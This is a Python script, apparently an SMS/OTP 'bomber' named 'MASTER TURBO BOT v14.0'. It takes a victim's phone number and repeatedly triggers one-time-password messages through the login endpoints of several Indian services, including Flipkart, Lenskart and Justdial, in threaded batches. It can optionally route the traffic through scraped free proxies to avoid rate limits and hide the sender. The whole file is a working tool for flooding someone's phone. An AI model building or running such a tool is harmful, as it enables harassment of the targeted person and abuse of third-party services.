import requests
import os
import time
import random
import threading

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

success_count = 0
failed_count = 0
proxylist = []
use_proxy = False # Ise True tabhi karein jab bahut zyada bombing karni ho

# --- 1. PROXY SCRAPER (Optimized) ---
def fetch_proxies():
    global proxylist
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
    try:
        r = requests.get(url, timeout=10)
        proxylist = r.text.split()
        print(f"{G}[*] {len(proxylist)} Proxies Loaded!{W}")
    except:
        print(f"{R}[!] Proxy Load Failed.{W}")

def get_random_proxy():
    if use_proxy and proxylist:
        p = random.choice(proxylist)
        return {'http': f'http://{p}', 'https': f'http://{p}'}
    return None

# --- 2. FRESH API LOGICS ---
def send_otp(api_name, target):
    global success_count, failed_count
    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
    proxy = get_random_proxy()
    
    try:
        # --- WORKING APIs ---
        if api_name == "housing":
            url = "https://login.housing.com/api/v2/send-otp"
            res = requests.post(url, json={"phone": target}, headers={"User-Agent": ua}, proxies=proxy, timeout=10)
        
        elif api_name == "confirmtkt":
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={target}&newOtp=true"
            res = requests.get(url, headers={"User-Agent": ua}, proxies=proxy, timeout=10)

        elif api_name == "flipkart":
            url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
            headers = {
                "X-user-agent": ua + " FKUA/website/42/website/Desktop",
                "Content-Type": "application/json",
                "User-Agent": ua
            }
            res = requests.post(url, json={"loginId": "+91" + target}, headers=headers, proxies=proxy, timeout=10)

        elif api_name == "lenskart":
            url = "https://api.lenskart.com/v2/customers/sendOtp"
            res = requests.post(url, json={"telephone": target}, headers={"x-api-client": "desktop", "User-Agent": ua}, proxies=proxy, timeout=10)

        elif api_name == "justdial":
            url = "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php"
            res = requests.get(url, params={"mobile": target}, headers={"User-Agent": ua}, proxies=proxy, timeout=10)

        elif api_name == "unacademy":
            url = "https://unacademy.com/api/v1/user/get_app_link/"
            res = requests.post(url, json={"phone": target}, headers={"User-Agent": ua}, proxies=proxy, timeout=10)

        # Result Check
        if res.status_code == 200 or res.status_code == 201:
            success_count += 1
            print(f"{G}[SUCCESS] {api_name} sent!{W}")
        else:
            raise Exception("Fail")

    except:
        failed_count += 1
        # Debugging ke liye hata diya print taaki screen saaf rahe
        pass

# --- 3. MAIN INTERFACE ---
def main():
    global use_proxy
    os.system("clear")
    print(f"{G}========================================")
    print("      🚀 MASTER TURBO BOT v14.0        ")
    print(f"========================================{W}\n")
    
    target = input(f"{G}Enter Number: {W}")
    limit = int(input(f"{G}Enter Limit: {W}"))
    
    px = input(f"{Y}Use Proxy? (y/n): {W}").lower()
    if px == 'y':
        use_proxy = True
        print(f"{Y}[*] Fetching Proxies...{W}")
        fetch_proxies()
    else:
        use_proxy = False
        print(f"{G}[*] Using Direct IP (Faster)...{W}")

    print(f"\n{G}[*] Attacking {target}...{W}\n")
    
    apis = ["housing", "confirmtkt", "flipkart", "lenskart", "justdial", "unacademy"]
    
    sent = 0
    while sent < limit:
        threads = []
        for api in apis:
            if sent >= limit: break
            t = threading.Thread(target=send_otp, args=(api, target))
            t.start()
            threads.append(t)
            sent += 1
            time.sleep(0.3)
        for t in threads: t.join() # Wait for batch to finish

    print(f"\n{G}--- DONE | OK: {success_count} | FAIL: {failed_count} ---{W}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{R}Stopped.{W}")
